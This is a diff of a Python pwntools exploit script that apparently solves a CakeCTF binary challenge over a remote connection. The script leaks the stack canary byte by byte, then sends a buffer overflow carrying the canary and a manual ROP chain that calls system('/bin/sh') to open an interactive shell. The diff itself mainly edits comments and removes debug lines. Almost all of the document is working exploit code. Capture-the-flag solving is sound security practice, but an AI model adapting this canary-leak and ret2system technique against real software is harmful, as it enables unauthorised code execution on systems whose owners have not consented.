@@ -1,7 +1,6 @@
 from pwn import *
 
 context.terminal = ["tmux", "splitw", "-h"]
-context.aslr = True
 
 
 #p = process("./chall")
@@ -9,7 +8,7 @@ context.aslr = True
 ##b *0x4023e0
 #c
 #""")
-#p = process("./chall")
+
 p = remote("pwn.cakectf.com", "9004")
 #context.log_level = "debug"
 p.recvuntil(b">>")
@@ -42,9 +41,8 @@ print(hex(canary_addr))
 
 total_canary = b""
 for x in range(8):
-    canary_leak1 = leak(canary_addr + x) # plus one because first byte is always null byte
+    canary_leak1 = leak(canary_addr + x) # read one byte at a time
     total_canary += p8(canary_leak1 & 0xff)
-    #canary_leak1 = (canary_leak << 8) & 0xffffffffffffffff
 total_canary = u64(total_canary)
 print(hex(total_canary))
 
@@ -54,21 +52,18 @@ print(hex(bin_sh_addr))
 # Manual ROP chain
 
 rop = b""
-rop += b"F" * 24 # the pop rbx and pop rbp
+rop += b"F" * 24 # between canary check and ret there is pop rbx, pop rbp, and add rsp, 8
 rop += p64(0x0000000000403a33) # pop rdi; ret
 rop += p64(bin_sh_addr)
 rop += p64(0x403a34) # ret; (for alignment)
 rop += p64(system_addr)
 
 p.sendline(b"1")
-p.sendline(b"0") # ocicat
+p.sendline(b"0") # bengal
 p.sendline(b"69")
-#p.sendline(b"lol")
 p.sendline(b"z" * 0x88 + p64(total_canary) + rop)
 
-#p.sendline(b"3")
-#p.sendline(b"69")
-#p.sendline(b"z" * 0x38 + b"q" * 8 + b"r" * 8 + b"s" * 8)
+
 
 
 p.interactive()
